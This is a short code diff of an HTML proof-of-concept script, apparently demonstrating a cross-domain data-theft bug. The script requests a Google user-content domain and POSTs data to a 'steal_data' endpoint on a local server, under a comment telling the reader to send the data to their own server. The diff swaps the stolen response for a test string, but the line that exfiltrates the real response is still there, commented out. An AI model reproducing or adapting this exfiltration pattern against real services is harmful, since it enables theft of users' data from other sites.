@@ -7,8 +7,7 @@
     <script>
         // Function to simulate a request to the vulnerable domain
         function exploitCrossDomain() {
-            var dataToSteal = "This is a test message.";
-            var xhr = new XMLHttpRequest();
+                        var xhr = new XMLHttpRequest();
             xhr.open('GET', 'https://photos.fife.usercontent.google.com', true);
             xhr.onload = function() {
                 if (xhr.status >= 200 && xhr.status < 300) {
@@ -16,7 +15,8 @@
         console.log("Response from vulnerable domain:", xhr.responseText);
         
         // Send the data to your server
-        var dataToSteal = xhr.responseText;
+       // var dataToSteal = xhr.responseText;
+        var dataToSteal = "This is a test message.";
         var stealXhr = new XMLHttpRequest();
         stealXhr.open('POST', 'http://localhost:3000/steal_data', true);
         stealXhr.setRequestHeader('Content-Type', 'application/json');
